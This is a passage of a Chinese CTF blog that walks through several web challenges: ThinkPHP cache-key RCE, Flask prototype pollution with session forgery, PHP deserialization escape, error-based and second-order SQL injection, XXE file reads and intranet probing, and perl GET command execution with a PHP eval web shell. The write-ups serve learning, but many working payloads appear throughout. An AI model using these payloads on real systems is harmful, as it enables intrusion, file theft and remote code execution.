__DIR__.&#x27;/../../config/route.php&#x27;; $config[&#x27;request_cache_key&#x27;] = $isCache; $config[&#x27;request_cache_expire&#x27;] = intval($cacheTime); $config[&#x27;request_cache_except&#x27;] = []; file_put_contents(__DIR__.&#x27;/../../config/route.php&#x27;, &#x27;&lt;?php return &#x27;. var_export($config, true). &#x27;;&#x27;); return &#x27;cache is enabled&#x27;; &#125;else&#123; return &#x27;Welcome ,cache is disabled&#x27;; &#125; &#125;&#125; 看不出什么，再看一下网站，logo 是 tp，加上报错页面 thinkphp 的模板框架无疑 v8.0 网上没什么漏洞，那应该是这个页面写了漏洞，还得下载源码分析。注意这里不能去下 github 上的 tp，会少文件，按照官网的步骤用 composer 安装即可。（我安在了kali下，然后移出来看的 https://doc.thinkphp.cn/v8_0/setup.html 可以看到靶机的源码是在 controller 下 index.php 文件,我们复制然后替换到源码里面。 注意到 index.php 里我们可控的参数是 $isCache，$isCache，也就是 $config[‘request_cache_key’]，$config[‘request_cache_expire’] 12$config[&#x27;request_cache_key&#x27;] = $isCache;$config[&#x27;request_cache_expire&#x27;] = intval($cacheTime); 最后看把 $config 写入了 &#x2F;..&#x2F;..&#x2F;config&#x2F;route.php 1file_put_contents(__DIR__.&#x27;/../../config/route.php&#x27;, &#x27;&lt;?php return &#x27;. var_export($config, true). &#x27;;&#x27;); 所以查找 config&#x2F;route.php 1234567891011121314151617181920212223&lt;?php return array ( &#x27;pathinfo_depr&#x27; =&gt; &#x27;/&#x27;, &#x27;url_html_suffix&#x27; =&gt; &#x27;html&#x27;, &#x27;url_common_param&#x27; =&gt; true, &#x27;url_lazy_route&#x27; =&gt; false, &#x27;url_route_must&#x27; =&gt; false, &#x27;route_rule_merge&#x27; =&gt; false, &#x27;route_complete_match&#x27; =&gt; false, &#x27;controller_layer&#x27; =&gt; &#x27;controller&#x27;, &#x27;empty_controller&#x27; =&gt; &#x27;Error&#x27;, &#x27;controller_suffix&#x27; =&gt; false, &#x27;default_route_pattern&#x27; =&gt; &#x27;[\\\\w\\\\.]+&#x27;, &#x27;request_cache_key&#x27; =&gt; true, &#x27;request_cache_expire&#x27; =&gt; 1, &#x27;request_cache_except&#x27; =&gt; array ( ), &#x27;default_controller&#x27; =&gt; &#x27;Index&#x27;, &#x27;default_action&#x27; =&gt; &#x27;index&#x27;, &#x27;action_suffix&#x27; =&gt; &#x27;&#x27;, &#x27;default_jsonp_handler&#x27; =&gt; &#x27;jsonpReturn&#x27;, &#x27;var_jsonp_handler&#x27; =&gt; &#x27;callback&#x27;,); 先从可控的 request_cache_key 开始全局搜索，最后在 CheckRequestCache.php 页面找到。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183&lt;?php// +----------------------------------------------------------------------// | ThinkPHP [ WE CAN DO IT JUST THINK ]// +----------------------------------------------------------------------// | Copyright (c) 2006~2023 http://thinkphp.cn All rights reserved.// +----------------------------------------------------------------------// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )// +----------------------------------------------------------------------// | Author: liu21st &lt;liu21st@gmail.com&gt;// +----------------------------------------------------------------------declare(strict_types=1);namespace think\\middleware;use Closure;use think\\Cache;use think\\Config;use think\\Request;use think\\Response;/** * 请求缓存处理 */class CheckRequestCache&#123; /** * 缓存对象 * @var Cache */ protected $cache; /** * 配置参数 * @var array */ protected $config = [ // 请求缓存规则 true为自动规则 &#x27;request_cache_key&#x27; =&gt; true, // 请求缓存有效期 &#x27;request_cache_expire&#x27; =&gt; null, // 全局请求缓存排除规则 &#x27;request_cache_except&#x27; =&gt; [], // 请求缓存的Tag &#x27;request_cache_tag&#x27; =&gt; &#x27;&#x27;, ]; public function __construct(Cache $cache, Config $config) &#123; $this-&gt;cache = $cache; $this-&gt;config = array_merge($this-&gt;config, $config-&gt;get(&#x27;route&#x27;)); &#125; /** * 设置当前地址的请求缓存 * @access public * @param Request $request * @param Closure $next * @param mixed $cache * @return Response */ public function handle(Request $request, Closure $next, $cache = null): Response &#123; if ($request-&gt;isGet() &amp;&amp; false !== $cache) &#123; if (false === $this-&gt;config[&#x27;request_cache_key&#x27;]) &#123; // 关闭当前缓存 $cache = false; &#125; $cache = $cache ?? $this-&gt;getRequestCache($request); if ($cache) &#123; if (is_array($cache)) &#123; [$key, $expire, $tag] = array_pad($cache, 3, &#x27;&#x27;); &#125; else &#123; $key = md5($request-&gt;url(true)); $expire = $cache; $tag = &#x27;&#x27;; &#125; $key = $this-&gt;parseCacheKey($request, $key); if (strtotime($request-&gt;server(&#x27;HTTP_IF_MODIFIED_SINCE&#x27;, &#x27;&#x27;)) + $expire &gt; $request-&gt;server(&#x27;REQUEST_TIME&#x27;)) &#123; // 读取缓存 return Response::create()-&gt;code(304); &#125; elseif (($hit = $this-&gt;cache-&gt;get($key)) !== null) &#123; [$content, $header, $when] = $hit; if (null === $expire || $when + $expire &gt; $request-&gt;server(&#x27;REQUEST_TIME&#x27;)) &#123; return Response::create($content)-&gt;header($header); &#125; &#125; &#125; &#125; $response = $next($request); if (isset($key) &amp;&amp; 200 == $response-&gt;getCode() &amp;&amp; $response-&gt;isAllowCache()) &#123; $header = $response-&gt;getHeader(); $header[&#x27;Cache-Control&#x27;] = &#x27;max-age=&#x27; . $expire . &#x27;,must-revalidate&#x27;; $header[&#x27;Last-Modified&#x27;] = gmdate(&#x27;D, d M Y H:i:s&#x27;) . &#x27; GMT&#x27;; $header[&#x27;Expires&#x27;] = gmdate(&#x27;D, d M Y H:i:s&#x27;, time() + $expire) . &#x27; GMT&#x27;; $this-&gt;cache-&gt;tag($tag)-&gt;set($key, [$response-&gt;getContent(), $header, time()], $expire); &#125; return $response; &#125; /** * 读取当前地址的请求缓存信息 * @access protected * @param Request $request * @return mixed */ protected function getRequestCache($request) &#123; $key = $this-&gt;config[&#x27;request_cache_key&#x27;]; $expire = $this-&gt;config[&#x27;request_cache_expire&#x27;]; $except = $this-&gt;config[&#x27;request_cache_except&#x27;]; $tag = $this-&gt;config[&#x27;request_cache_tag&#x27;]; foreach ($except as $rule) &#123; if (0 === stripos($request-&gt;url(), $rule)) &#123; return; &#125; &#125; return [$key, $expire, $tag]; &#125; /** * 读取当前地址的请求缓存信息 * @access protected * @param Request $request * @param mixed $key * @return null|string */ protected function parseCacheKey($request, $key) &#123; if ($key instanceof Closure) &#123; $key = call_user_func($key, $request); &#125; if (false === $key) &#123; // 关闭当前缓存 return; &#125; if (true === $key) &#123; // 自动缓存功能 $key = &#x27;__URL__&#x27;; &#125; elseif (str_contains($key, &#x27;|&#x27;)) &#123; [$key, $fun] = explode(&#x27;|&#x27;, $key); &#125; // 特殊规则替换 if (str_contains($key, &#x27;__&#x27;)) &#123; $key = str_replace([&#x27;__CONTROLLER__&#x27;, &#x27;__ACTION__&#x27;, &#x27;__URL__&#x27;], [$request-&gt;controller(), $request-&gt;action(), md5($request-&gt;url(true))], $key); &#125; if (str_contains($key, &#x27;:&#x27;)) &#123; $param = $request-&gt;param(); foreach ($param as $item =&gt; $val) &#123; if (is_string($val) &amp;&amp; str_contains($key, &#x27;:&#x27; . $item)) &#123; $key = str_replace(&#x27;:&#x27; . $item, (string) $val, $key); &#125; &#125; &#125; elseif (str_contains($key, &#x27;]&#x27;)) &#123; if (&#x27;[&#x27; . $request-&gt;ext() . &#x27;]&#x27; == $key) &#123; // 缓存某个后缀的请求 $key = md5($request-&gt;url()); &#125; else &#123; return; &#125; &#125; if (isset($fun)) &#123; $key = $fun($key); &#125; return $key; &#125;&#125; 注意到 123if (isset($fun)) &#123; $key = $fun($key); &#125; 很像漏洞点，直接开始下断点调试，注意得去 &#x2F;public&#x2F;index.php 页面下开始 debug,我也不知道为什么，可能 tp 团队定义的路由规则。还要注意把 $cacheTime 改为 1，不然会执行很久。 动态调试时发现进不去这个判断，向上找 123elseif (str_contains($key, &#x27;|&#x27;)) &#123; [$key, $fun] = explode(&#x27;|&#x27;, $key); &#125; 原来用 explode(‘|’, $key); 来得到 $fun,而且发现这个 $key 就是 config[‘request_cache_key’]。我们在 route.php 修改一下 1&#x27;request_cache_key&#x27; =&gt; &quot;whoami|system&quot; 然后再动态调试 执行成功。最后根据 tp 路由规则发包即可thinkPHP 参数传入 - 聽丶 - 博客园 (cnblogs.com) 1https://225f8924-0efe-462c-b06b-49274664151e.challenge.ctf.show/index.php/index/index?isCache=cat /000f1ag.txt|system&amp;cacheTime=0 因为 cache 缓存时间，多刷新几遍就能 rce 了 easy_polluted根据题目名应该是原型链污染之类的，下载源码看看。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from flask import Flask, session, redirect, url_for,request,render_templateimport osimport hashlibimport jsonimport redef generate_random_md5(): random_string = os.urandom(16) md5_hash = hashlib.md5(random_string) return md5_hash.hexdigest()def filter(user_input):a blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;string&#x27;] for pattern in blacklisted_patterns: if re.search(pattern, user_input, re.IGNORECASE): return True return Falsedef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, &#x27;__getitem__&#x27;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)app = Flask(__name__)app.secret_key = generate_random_md5()class evil(): def __init__(self): pass@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;])def index(): username = request.form.get(&#x27;username&#x27;) password = request.form.get(&#x27;password&#x27;) session[&quot;username&quot;] = username session[&quot;password&quot;] = password Evil = evil() if request.data: if filter(str(request.data)): return &quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot; else: merge(json.loads(request.data), Evil) return &quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot; return render_template(&quot;index.html&quot;)@app.route(&#x27;/admin&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def templates(): username = session.get(&quot;username&quot;, None) password = session.get(&quot;password&quot;, None) if username and password: if username == &quot;adminer&quot; and password == app.secret_key: return render_template(&quot;flag.html&quot;, flag=open(&quot;/flag&quot;, &quot;rt&quot;).read()) else: return &quot;Unauthorized&quot; else: return f&#x27;Hello, This is the POLLUTED page.&#x27;if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) 注意到 admin 路由下可以读取 flag，但是会验证 session，我们都知道 flask 的session 可以伪造，但是得知道 secret_key 。正好 Evil 实例可以通过 merge 函数污染环境变量，那我们就可以修改 secret_key 为自己想要的，然后伪造 session 签名通过验证。 0x01 merge 污染根据这篇文章就能理解污染原理。浅谈Python原型链污染及利用方式 - 先知社区 (aliyun.com) 刚好我们可以利用 Evil 的 __init__ 魔术方法来推链子（感觉像 ssti 123456789json_data = &#123; &quot;__init__&quot;: &#123; &quot;__globals__&quot;:&#123; &quot;app&quot;:&#123; &quot;secret_key&quot;:&quot;pass&quot; &#125; &#125; &#125; &#125; json 数据是因为 1merge(json.loads(request.data), Evil) 注意到有 WAF，我们可以 unicode 编码来绕过，json_loads 能识别 unicode 123456789&#123; &quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&quot;: &#123; &quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;:&#123; &quot;\\u0061\\u0070\\u0070&quot;:&#123; &quot;\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u005f\\u006b\\u0065\\u0079&quot;:&quot;pass&quot; &#125; &#125; &#125;&#125; 0x02 session 伪造对flask session伪造的学习 - GTL_JU - 博客园 (cnblogs.com) 1python 1.py encode -s &#x27;pass&#x27; -t &quot;&#123;&#x27;password&#x27;: &#x27;pass&#x27;, &#x27;username&#x27;: &#x27;adminer&#x27;&#125;&quot; 然后填入 session 访问 admin 路由，返回包 12这又是什么jinja语法啊！ [#flag#] 0x04 污染 jinja 引擎语法提示我们修改 jinja 的模板引擎语法，正常来说应该是 &#123;&#123;&#125;&#125;,&#123;%%&#125;。正好模板语法的定义也在 app 下 12print(Evil.__init__.__globals__[&#x27;app&#x27;].jinja_env.variable_start_string)print(Evil.__init__.__globals__[&#x27;app&#x27;].jinja_env.variable_end_string) 污染的话 jinja_env.variable_start_string 改为 [#,jinja_env.variable_end_string 污染为 #] 即可。 123456789101112&#123; &quot;__init__&quot; : &#123; &quot;__globals__&quot; : &#123; &quot;app&quot; : &#123; &quot;jinja_env&quot; :&#123;&quot;variable_start_string&quot; : &quot;[#&quot;,&quot;variable_end_string&quot;:&quot;#]&quot; &#125; &#125; &#125; &#125; &#125; 不过得重置靶机再访问 admin 之前就要修改语法，我猜这和 flask 的渲染机制有关。 重置靶机之后，直接 key 和 jinja 一起修改 12345678910111213&#123; &quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&quot; : &#123; &quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot; : &#123; &quot;\\u0061\\u0070\\u0070&quot; : &#123; &quot;\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u005f\\u006b\\u0065\\u0079&quot;:&quot;pass&quot;, &quot;\\u006a\\u0069\\u006e\\u006a\\u0061\\u005f\\u0065\\u006e\\u0076&quot; :&#123;&quot;\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0074\\u0061\\u0072\\u0074\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067&quot; : &quot;[#&quot;, &quot;\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006c\\u0065\\u005f\\u0065\\u006e\\u0064\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067&quot;:&quot;#]&quot; &#125; &#125; &#125; &#125; &#125; 最后带着伪造的 session 访问 admin 路由得到 flag 0x05 法二：修改 _static_folder 为根目录_static_folder 打印出来为 static，当我们访问 url&#x2F;static&#x2F;1.js 的时候是不用路由验证的，那我们就可以把 _static_folder 的值改为 “&#x2F;“，这样访问 url&#x2F;static&#x2F; 就可以映射根目录下的资源 1&#123;&quot;__init__&quot; : &#123;&quot;__globals__&quot; :&#123;&quot;app&quot; :&#123;&quot;_static_folder&quot;:&quot;/&quot;&#125;&#125;&#125;&#125; 然后直接访问 url&#x2F;static&#x2F;flag(这里修不修改 key 已经无所谓了。 Ezzz_php1234567891011121314151617181920212223242526272829303132&lt;?php highlight_file(__FILE__);error_reporting(0);function substrstr($data)&#123; $start = mb_strpos($data, &quot;[&quot;); $end = mb_strpos($data, &quot;]&quot;); return mb_substr($data, $start + 1, $end - 1 - $start);&#125;class read_file&#123; public $start; public $filename=&quot;/etc/passwd&quot;; public function __construct($start)&#123; $this-&gt;start=$start; &#125; public function __destruct()&#123; if($this-&gt;start == &quot;gxngxngxn&quot;)&#123; echo &#x27;What you are reading is:&#x27;.file_get_contents($this-&gt;filename); &#125; &#125;&#125;if(isset($_GET[&#x27;start&#x27;]))&#123; $readfile = new read_file($_GET[&#x27;start&#x27;]); $read=isset($_GET[&#x27;read&#x27;])?$_GET[&#x27;read&#x27;]:&quot;I_want_to_Read_flag&quot;; if(preg_match(&quot;/\\[|\\]/i&quot;, $_GET[&#x27;read&#x27;]))&#123; die(&quot;NONONO!!!&quot;); &#125; $ctf = substrstr($read.&quot;[&quot;.serialize($readfile).&quot;]&quot;); unserialize($ctf);&#125;else&#123; echo &quot;Start_Funny_CTF!!!&quot;;&#125; Start_Funny_CTF!!! 0x01 前置知识先来了解两个小 tips 123456&lt;?phphighlight_file(__FILE__);echo mb_strpos($_GET[1].&quot;AAA&lt;BB&quot;, &#x27;&lt;&#x27;);echo &quot;&lt;/br&gt;&quot;;echo mb_substr($_GET[2].&quot;AAA&lt;BB&quot;,0,2);?&gt; 1?1=%9f&amp;2=%f0 输出： 123�AAA&lt; mb_strpos这个函数在遇到 %9f 这个不可见字符时，会自动忽略 mb_substr，他会把 %f0 连着后面的三个字符当成一个字符来识别 0x02 构造逃逸先构造 1read = O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125; 然后不断在前面加上 %9f 这样就可以使截取长度不变，截取位置改变。 1read=%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9fO:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;&amp;start=gxngxngxn 但是没有 &#x2F;flag 页面。要利用 file_get_contents($this-&gt;filename); 来rce 【翻译】从设置字符集到RCE：利用 GLIBC 攻击 PHP 引擎（篇一） 看不懂，开摆。。。","tags":["ctf","刷题","比赛","原型链污染","session 伪造","thinkphp","php","反序列化"],"categories":["CTF"]},{"title":"buu Web第三页（持续更新）","path":"/2024/07/18/ctf/buu/WebPage 3/","content":"buuCTF web第三页刷题记录 [RCTF2015]EasySQL登陆注册页面貌似没有什么注册点，但是过滤了一些字符，比如空格。来到修改密码页面，假如以 1” 注册，就会产生报错 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot; and pwd=&#39;c20ad4d76fe97759aa27a0c99bff6710&#39;&#39; at line 1 所以注册点应该是在这里，属于是二次注入 SQL注入之二次注入（详细加演示）_sql二次注入如何注入-CSDN博客，既然有报错，那我们就可以利用报错注入 报错注入是什么？一看你就明白了。报错注入原理+步骤+实战案例-CSDN博客 根据这个报错猜测代码是 1select * from user where username=&quot;$user&quot; and password=&quot;$pwd&quot; 接下来的 payload（extractValue，空格被过滤） 123456789101112131415# 查数据库1&quot;||(updatexml(1,concat(&quot;~&quot;,(select(database()))),1))#web_sqli#查表名1&quot;||(updatexml(1,concat(&quot;~&quot;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;web_sqli&#x27;))),1))#article,flag,users#查列名1&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))#flag#查数据1&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(flag))from(flag))),1))#RCTF&#123;Good job! But flag not her flag 不在这 123456#查列名1&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;))),1))#~name,pwd,email,real_flag_1s_her#查数据1&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(real_flag_1s_her))from(users))),1))# 这里直接报错了，说不存在 real_flag_1s_her 字段，我们知道报错注入的这些函数只能带出 32 位字符串，所以我们先把 ‘~’ 去除 123451&quot;||(updatexml(1,concat((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;))),1))#real_flag_1s_here1&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(real_flag_1s_here))from(users))),1))#xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx 这里是因为字段下的值有很多，flag 不好找，所以我们用一下 sql 里的正则匹配 REGEXP 来直接匹配 flag 开头的字符串 SQL:REGEXP (runoob.com) 121&quot;||(updatexml(1,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)),1))#&#123;47580ad2-e2fd-4058-9dac-2c7d3eb 只得到一半，利用 reverse 反转字符串。SQL–字符串反转函数 reverse() 简单明了_sql reverse-CSDN博客 121&quot;||(updatexml(1,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),1))#&#125;aff4bbe3d7c2-cad9-8504-df2e-2da 最后反转回来得到 ad2-e2fd-4058-9dac-2c7d3ebb4ffa} 1flag&#123;47580ad2-e2fd-4058-9dac-2c7d3ebb4ffa&#125; [NCTF2019]True XML cookbook看题目名就知道是 xxe 了，打开来是一个登陆页面，简单抓个包。 可以看到返回包有个 admin，可以推测出回显处在 username 标签里，套一下xxe模板验证一下 1234&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; 也是拿到了敏感信息，但是没有 flag 文件，尝试拿取源码 1234&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;file:///var/www/html/doLogin.php&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; 不知道为什么返回 0，可能因为是 php 文件，我们用伪协议把它转成 base64 . 1234&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=doLogin.php&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; 不过没什么有用信息，看 wp 说是 flag 存在于内网主机上，我们需要通过XXE对内网进行探测，这里我们可以用 http 或者 gopher 协议，反正 xxe 都支持。 那么如何确定主机 ip 呢？先查看几个配置文件 &#x2F;proc&#x2F;net&#x2F;fib_trie，&#x2F;proc&#x2F;net&#x2F;arp，&#x2F;etc&#x2F;hosts。这几个文件都跟正在运行的进程的网络配置信息有关 1234&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;file:///proc/net/fib_trie&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; 这几个文件和主机 ip 有关，得到几个内网 ip 123169.254.1.110.244.80.3910.128.253.12 一般掩码都是 24 位吧，所以就用 BP 爆破最后八位吧，最后发现那个内网 ip 是 10.244.80.xx，还有一种说法是 BUUCTF 转用了K8S管理，他的靶机容器是随机在80，81两个网段里的，所以哪个 ip 用的这两个网段也行。 1234&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;http://10.244.80.§39§&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; 这里最好开 100 个线程爆破，最后在 10.244.80.140 发现 flag [CISCN2019 华北赛区 Day1 Web5]CyberPunk打开页面，f12 提示 ?file= ,加上提示 flag 在根目录下，先试着读取 &#x2F;flag，&#x2F;flag.txt ，没有 o.O ？伪协议读取网站的几个 php 页面看看。 index.php 1234567891011121314&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#x27;file&#x27;]) ? $_GET[&#x27;file&#x27;] : null);if (isset($file))&#123; if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123; echo(&#x27;no way!&#x27;); exit; &#125; @include($file);&#125;?&gt; 难怪读不了根目录，被 open_basedir 限制住了。继续往下看 confirm.php 12345678910111213141516171819202122232425262728293031323334353637&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $address = $_POST[&quot;address&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if($fetch-&gt;num_rows&gt;0) &#123; $msg = $user_name.&quot;已提交订单&quot;; &#125;else&#123; $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;; $re = $db-&gt;prepare($sql); $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone); $re = $re-&gt;execute(); if(!$re) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;订单提交成功&quot;; &#125;&#125; else &#123; $msg = &quot;信息不全&quot;;&#125;?&gt; 可以看到有预处理，所以这个页面 sql 注入的可能性应该不大。 change.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;]; $result = $db-&gt;query($sql); if(!$result) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;订单修改成功&quot;; &#125; else &#123; $msg = &quot;未找到订单!&quot;; &#125;&#125;else &#123; $msg = &quot;信息不全&quot;;&#125;?&gt; 这里虽然对 user_name ,phone 做了校验，但是 address 直接就处理了，可以从这里注入，而且查询页面也没有对更新的地址处理，所以相当于这里有一个二次注入点。 1address=&#x27;,`address`=database()%23&amp;phone=1&amp;user_name=1 所以直接试试读取文件 1address=&#x27;,`address`=load_file(&quot;/flag.txt&quot;)%23&amp;phone=1&amp;user_name=1 得到 flag。 [HITCON 2017]SSRFme一道 php 代码审计 12345678910111213141516171819106.224.184.126 &lt;?php if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]); $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0]; &#125; echo $_SERVER[&quot;REMOTE_ADDR&quot;]; $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); $info = pathinfo($_GET[&quot;filename&quot;]); $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); 关键在 GET 命令上 linuxget命令详解 • Worktile社区，如果第一个参数是文件夹则等得到其下的所有目录以及文件名，如果是文件就能直接下载。 因为 $http_x_headers 可控，所以创建的文件夹以及文件名我们都可以控制，令 X-FORWARDED-FOR 字段为 1，目录计算一下就是 sandbox&#x2F;b3e24b7672fddf21613da79b21ff7c99 。 直接试一下看根目录 1?url=/&amp;filename=b 然后访问 sandbox&#x2F;b3e24b7672fddf21613da79b21ff7c99&#x2F;b 试着下载 &#x2F;flag 文件，失败。发现还有 &#x2F;readflag 文件，应该是权限不够，我们只要执行 &#x2F;readflag 就能拿到 flag 了。 法一：perl脚本GET系统命令执行[perl脚本中GET命令执行漏洞（HITCON 2017]SSRFme）_perl漏洞-CSDN博客 123touch &#x27;id|&#x27;GET ’file:id|&#x27;uid=0(root) gid=0(root) groups=0(root) perl脚本中GET命令基于 open 函数，open 函数支持 file 协议所以可以把文件名当命令来执行（前提该文件存在），我们想执行 &#x2F;readflag，相当于 bash -c /readflag,那就要先创建一个 bash -c &#x2F;readflag| 文件。 我们知道创建文件名可控，所以 1?url=&amp;filename=bash -c /readflag| 然后执行 1?url=file:bash -c /readflag|&amp;filename=b 访问 b 文件即可。 法二：data 伪协议【HITCON 2017】SSRFme——最简单伪协议思路 - CAP_T - 博客园 (cnblogs.com) 这里也难用 data 协议写🐎，我猜测 open 函数也支持 data 协议（好神奇），命令行会把 &lt;? 作为保留字处理，所以用引号包裹起来 1?url=data://text/plain,&#x27;&lt;?eval($_POST[1])?&gt;&#x27;&amp;filename=shell.php 访问 shell.php sandbox/b3e24b7672fddf21613da79b21ff7c99/shell.php 11=system(&quot;bash -c /readflag&quot;); 即可得到 flag [网鼎杯 2020 